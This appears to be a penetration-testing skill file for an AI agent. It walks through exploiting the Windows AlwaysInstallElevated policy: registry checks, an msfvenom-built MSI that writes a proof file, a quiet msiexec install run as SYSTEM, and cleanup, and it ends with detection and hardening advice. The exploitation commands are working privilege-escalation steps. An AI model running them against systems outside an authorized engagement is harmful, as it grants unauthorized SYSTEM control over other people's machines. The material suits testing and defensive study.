---
name: alwaysinstallelevated
description: Use when you have a Windows shell on an authorized engagement
  and need to check the AlwaysInstallElevated policy for privilege
  escalation. Covers registry enumeration of the policy, crafting a
  malicious MSI, and installing it for SYSTEM execution. Use when WinPEAS
  flags the policy, when you can write an MSI to disk, or when looking for
  a quick policy-based path to SYSTEM.
version: 1.0.0
domain: privesc
lifecycle: stable
last_verified: 2026-10-23
parent: privesc-windows
requires: [privesc-windows]
extends: []
relates: [privesc-linux]
tools:
  - name: PowerShell
    version: 7.4
  - name: Python
    version: 3.12
---

AlwaysInstallElevated lets any user install MSI packages with SYSTEM
privileges when both the machine and user policy keys are set. It is a
rare but instant win: one registry check, one MSI, one SYSTEM shell. This
skill covers the check and the exploitation on authorized engagements,
including building the MSI on your attack box and cleaning up afterward.

## Quick Workflow

1. Check both registry keys; both must be 1 for the technique to work.
2. If set, build a proof MSI on your attack box.
3. Transfer the MSI to the target.
4. Install it with msiexec and confirm SYSTEM execution.
5. Remove the MSI and any artifacts.

## 1. Registry check

```powershell
# Both keys must exist and equal 1
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# PowerShell equivalent with clear output
$u = (Get-ItemProperty -Path 'HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated -ErrorAction SilentlyContinue).AlwaysInstallElevated
$m = (Get-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated -ErrorAction SilentlyContinue).AlwaysInstallElevated
"User: $u  Machine: $m  (both must be 1)"
```

If either key is missing or 0, the technique does not apply. Do not try
to set the keys yourself: that is persistence and configuration change,
not privilege escalation, and it needs separate approval.

## 2. MSI crafting and execution

```bash
# Build the MSI on your attack box with msfvenom (proof payload first)
msfvenom -p windows/x64/exec CMD='cmd /c echo proof > C:\aiel_proof.txt' \
  -f msi -o /tmp/proof.msi

# Transfer to the target (SMB, HTTP, or the engagement's file channel)
# then install quietly:
```

```powershell
# On the target, install with SYSTEM privileges via the policy
msiexec /quiet /qn /i C:\Users\test\proof.msi

# Confirm the proof ran as SYSTEM (check file owner or content)
type C:\aiel_proof.txt
icacls C:\aiel_proof.txt
```

A benign proof (marker file) comes before any shell payload. The finding
is proven when the marker exists with SYSTEM ownership.

## Edge cases

- Only one key is set. The technique fails; report the partial
  configuration as a hardening note, not as an escalation path.
- msiexec is blocked by policy. The technique needs the installer
  service; if it is disabled, note it and move on.
- The MSI install needs a reboot or hangs. Use `/quiet /qn` and a
  timeout; a hanging installer on production is an availability risk.
- You cannot write the MSI to disk. Check alternate writable paths
  (TEMP, user profile); the MSI must be local for msiexec.

## Escalation

- The policy is not set: move to the other privesc-windows sub-skills;
  this one is binary, it works or it does not.
- You need a full shell, not just proof: rebuild the MSI with the
  approved shell payload only after the proof succeeds.
- Cleanup: uninstall the MSI (`msiexec /x`), delete the file, and
  verify no service or scheduled artifact remains.

## Detection and defender view

Defenders see this as an MSI installed by a non-admin user resulting in
SYSTEM processes, which stands out in installer and EDR logs. The fix is
simple: do not set AlwaysInstallElevated unless a real deployment need
demands it, and scope it as narrowly as possible. Monitoring MSI
installations by non-administrators catches abuse of the rare legitimate
deployments.

## Key references

- MITRE ATT&CK T1548.002 (Abuse Elevation Control Mechanism: Bypass User
  Account Control).
- CWE-250 (Execution with Unnecessary Privileges).
- Microsoft documentation on AlwaysInstallElevated policy.
